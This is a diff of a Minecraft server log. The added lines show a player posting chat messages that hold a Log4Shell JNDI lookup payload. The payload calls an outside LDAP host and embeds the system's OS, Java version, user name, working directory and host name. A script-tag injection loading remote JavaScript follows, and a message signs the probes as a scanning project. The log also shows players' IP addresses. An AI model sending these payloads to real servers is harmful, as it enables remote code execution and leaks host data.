@@ -1,5 +1,9 @@
-[08:59:18] [User Authenticator #2/INFO]: UUID of player oliveh2003 is 4ed76a30-9605-431e-a5eb-ccc9ad69b9a6
-[08:59:19] [Server thread/INFO]: oliveh2003 joined the game
-[08:59:19] [Server thread/INFO]: oliveh2003[/185.69.145.164:55493] logged in with entity id 637 at ([olly]-413.235940920994, 63.9375, 337.19616895040343)
-[09:00:00] [Server thread/INFO]: oliveh2003 lost connection: Disconnected
-[09:00:00] [Server thread/INFO]: oliveh2003 left the game
+[18:49:29] [Server thread/INFO]: com.mojang.authlib.GameProfile@c1584e[id=<null>,name=Notch,properties={},legacy=false] (/137.184.124.143:51804) lost connection: Disconnected
+[18:49:41] [User Authenticator #3/INFO]: UUID of player X_senpai_ is d8ade0c6-8116-4c35-9276-0c88a2aca42d
+[18:49:41] [Server thread/INFO]: X_senpai_ joined the game
+[18:49:41] [Server thread/INFO]: X_senpai_[/137.184.124.143:51860] logged in with entity id 859 at ([olly]-215.5, 67.0, 255.5)
+[18:49:42] [Async Chat Thread - #0/INFO]: <X_senpai_> test: ${jndi:ldap://mc.liveoverflow.com:1337/1378019538/${java:os},${java:version},${env:USER:${env:USERNAME}},${env:PWD},${env:HOSTNAME},}
+[18:49:42] [Async Chat Thread - #1/INFO]: <X_senpai_> test: <script src=//mcssl.liveoverflow.com/test/1378019538.js></script>
+[18:49:42] [Async Chat Thread - #1/INFO]: <X_senpai_> test: Hey! Sorry for the spam, I'm just scanning minecraft servers for a project. - @LiveOverflow
+[18:49:43] [Server thread/INFO]: X_senpai_ lost connection: Disconnected
+[18:49:43] [Server thread/INFO]: X_senpai_ left the game
